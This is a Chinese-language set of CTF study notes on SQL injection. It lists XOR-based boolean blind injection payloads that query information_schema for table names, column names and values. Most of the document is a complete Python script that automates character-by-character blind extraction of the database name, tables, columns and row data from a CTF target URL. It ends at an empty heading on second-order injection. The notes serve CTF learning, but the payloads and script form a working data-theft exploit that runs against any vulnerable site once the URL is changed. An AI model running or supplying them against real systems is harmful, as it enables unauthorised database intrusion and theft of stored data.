## **sql注入考点**
有可能flag在表中，有可能sql注入出账户密码再登录后配置其他漏洞。

利用报错，布尔，二次注入获取同库不同表的记录。

高权限注入：常规查询，跨库查询，文件读写。
堆叠注入：不限制于查询语句，甚至提权命令执行。

## **布尔盲注**
部分sql盲注入如逻辑布尔盲注回显差异，需要使用代码一个一个字符跑出来。

异或盲注?id=1^1^1，

1^1^1值为1
1^0^1值为0
在这个前提下，分析回显内容的字符差异，进行布尔盲注，代码中使用二分法加快布尔盲注。
```
substr("abc",1,1)获取第一位置的1个字符
ord()字符转ascii的数值
ascii()字符转ascii的数值

先判断是否布尔差异，并判断过滤字符
1^length(database())>4^1
1^length(database())<4^1


布尔，再异或的差异，获取表名
1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),1,1))>0)^1
[*] F1naI1y,Flaaaaag~
猜测列名
1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='表名')),1,1))>0)^1
猜测列的值
1^(ord(substr((select(group_concat(列名))from(表名)),1,1))>0)^1

从中可以利用二分法加速
select ascii() %s %d   
python中%s运算符%d每次的中间值，比较的结果select
```



案例：
<https://www.cnblogs.com/upfine/p/16367693.html#:~:text=%E5%88%86%E4%BA%AB%E4%B8%8B%E8%87%AA%E5%B7%B1%E5%9C%A8%E5%AE%8C%E6%88%90%20[>
![](.topwrite/assets/image_1728032287390.png)
![](.topwrite/assets/image_1728032303867.png)
![](.topwrite/assets/image_1728032328530.png)
```
import requests
import time


# 获取数据库信息
def get_db_info(strings, url, success):
    db_length = 1
    now_db_length = 1
    while db_length > 0:
        get_db_url = url + '/**/and/**/length(database())=' + str(db_length) + '#'
        result = requests.get(get_db_url).content.decode('utf-8')
        if success in result:
            print('数据库长度为：' + str(db_length))
            break
        db_length = db_length + 1
    db_name = ''
    while now_db_length < db_length + 1:
        for one_char in strings:
            get_db_url = url + '/**/and/**/substr(database(),' + str(now_db_length) + ',1)=%27' + one_char + '%27#'
            result = requests.get(get_db_url).content.decode('utf-8')
            if success in result:
                db_name = db_name + one_char
                break
        now_db_length = now_db_length + 1
        print("\r", end="")
        print('数据库名字为：' + db_name, end='')
    return db_name


# 获取数据库内表的信息
def get_table_info(strings, url, success, db_name):
    table_names = []
    table_num = 0
    while table_num >= 0:
        get_table_url = url + '/**/and/**/length((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=%27' + db_name + '%27/**/limit/**/' + str(
            table_num) + ',1))>0--+'
        result = requests.get(get_table_url).content.decode('utf-8')
        if success in result:
            table_num = table_num + 1
        else:
            break
    print('数据库内表的数量为：' + str(table_num))
    # 获得表的数量，但是需要+1，然后依次获取每个表的名称长度
    now_table_num = 0
    while now_table_num < table_num:
        length = 1
        while length > 0:
            get_table_url = url + '/**/and/**/length((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=%27' + db_name + '%27/**/limit/**/' + str(
                now_table_num) + ',1))=' + str(length) + '--+'
            result = requests.get(get_table_url).content.decode('utf-8')
            if success in result:
                break
            length = length + 1
        now_length = 1
        table_name = ''
        while now_length < length + 1:
            # 添加for循环获取字符
            for one_char in strings:
                get_table_url = url + '/**/and/**/substr((select/**/ table_name/**/from/**/information_schema.tables/**/where/**/table_schema=%27' + db_name + '%27/**/limit/**/' + str(
                    now_table_num) + ',1),' + str(now_length) + ',1)=%27' + one_char + '%27--+'
                result = requests.get(get_table_url).content.decode('utf-8')
                time.sleep(0.1)
                if success in result:
                    table_name = table_name + one_char
                    print("\r", end="")
                    print('表' + str(now_table_num + 1) + '名字为：' + table_name, end='')
                    break
            now_length = now_length + 1
        print('')
        table_names.append(table_name)
        # 开始指向下一个表
        now_table_num = now_table_num + 1
    return table_names


# 通过表名来获取表内列的信息，在必要的时候可以修改sql语句，通过db_name限制
def get_column_info(strings, url, success, db_name, table_names):
    # 开始获取第一个表内的列
    for i in range(0, len(table_names)):
        column_names = []
        column_num = 0
        # 获取第一个表内列的数量
        while column_num >= 0:
            get_column_url = url + '/**/and/**/length((select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name=%27' + str(
                table_names[i]) + '%27/**/limit/**/' + str(column_num) + ',1))>0--+'
            result = requests.get(get_column_url).content.decode('utf-8')
            if success in result:
                column_num = column_num + 1
            else:
                print(str(table_names[i]) + '表的列数量为：' + str(column_num))
                for now_column_num in range(0, column_num):
                    length = 1
                    while length >= 0:
                        get_column_url = url + '/**/and/**/length((select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name=%27' + str(
                            table_names[i]) + '%27/**/limit/**/' + str(now_column_num) + ',1))=' + str(length) + '--+'
                        result = requests.get(get_column_url).content.decode('utf-8')
                        if success in result:
                            # 获取列明
                            now_length = 1
                            column_name = ''
                            # for one_char in strings:
                            while now_length < length + 1:
                                for one_char in strings:
                                    get_column_url = url + '/**/and/**/substr((select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name=%27' + str(
                                        table_names[i]) + '%27/**/limit/**/' + str(now_column_num) + ',1),' + str(
                                        now_length) + ',1)=%27' + str(one_char) + '%27--+'
                                    result = requests.get(get_column_url).content.decode('utf-8')
                                    if success in result:
                                        column_name = column_name + str(one_char)
                                        now_length = now_length + 1
                                        print("\r", end="")
                                        print('第' + str(now_column_num + 1) + '列的名称为：' + column_name, end='')
                                        break
                            column_names.append(column_name)
                            print('')
                            break
                        else:
                            length = length + 1
                break
        # 读取第表内的数据
        get_data(strings, url, success, db_name, table_names[i], column_names)


# 定义读取表内数据的函数
def get_data(strings, url, success, db_name, table_names, column_names):
    print('开始获取表内数据------------------------------------------')
    # for i in range(0, len(table_names)):
    for k in range(0, len(column_names)):
        # 判断是否存在第k列
        row = 0
        while row >= 0:
            get_data_url = url + '/**/and/**/length((select/**/' + str(column_names[k]) + '/**/from/**/' + str(
                table_names) + '/**/limit/**/' + str(row) + ',1))>0--+'
            result = requests.get(get_data_url).content.decode('utf-8')
            if success in result:
                row = row + 1
                # 如果存在此列，就判断此列的数据长度
                length = 0
                while length >= 0:
                    get_data_url = url + '/**/and/**/length((select/**/' + str(
                        column_names[k]) + '/**/from/**/' + str(table_names) + '/**/limit/**/' + str(
                        row - 1) + ',1))=' + str(length) + '--+'
                    result = requests.get(get_data_url).content.decode('utf-8')
                    if success in result:
                        # 获得数据的长度
                        break
                    else:
                        length = length + 1
                # 获取此列的数据内容
                now_length = 1
                data = ''
                while now_length < length + 1:
                    for one_char in strings:
                        get_data_url = url + '/**/and/**/substr((select/**/' + str(
                            column_names[k]) + '/**/from/**/' + str(table_names) + '/**/limit/**/' + str(
                            row - 1) + ',1),' + str(now_length) + ',1)=%27' + str(one_char) + '%27--+'
                        result = requests.get(get_data_url).content.decode('utf-8')
                        if success in result:
                            data = data + one_char
                            print("\r", end="")
                            print(column_names[k] + '列的第' + str(row) + '行数据为：' + data, end='')
                            break
                    now_length = now_length + 1
            else:
                break
        print('')


if __name__ == '__main__':
    strings = 'abcdefghijklmnopqrstuvwxyz1234567890_{}-~'
    url = 'http://e52fe529-3073-41cc-8593-902fc8164090.node4.buuoj.cn:81/?stunum=1'
    success = 'your score is: 100'
    print('可以获取数据库内全部表的信息，但获取当前表的值需要修改success值')
    print('失败结果是一致的，可以修改为success为失败的值，则可以获取当前表数据')
    print('开始获取数据库信息---------------------------------------')
    db_name = get_db_info(strings, url, success)
    print('\n开始获取数据库内表信息------------------------------------')
    table_names = get_table_info(strings, url, success, db_name)
    print('开始获取表结构信息-----------------------------------------')
    get_column_info(strings, url, success, db_name, table_names)
    print('获取表数据信息结束-----------------------------------------')
```


^
## **二次注入**
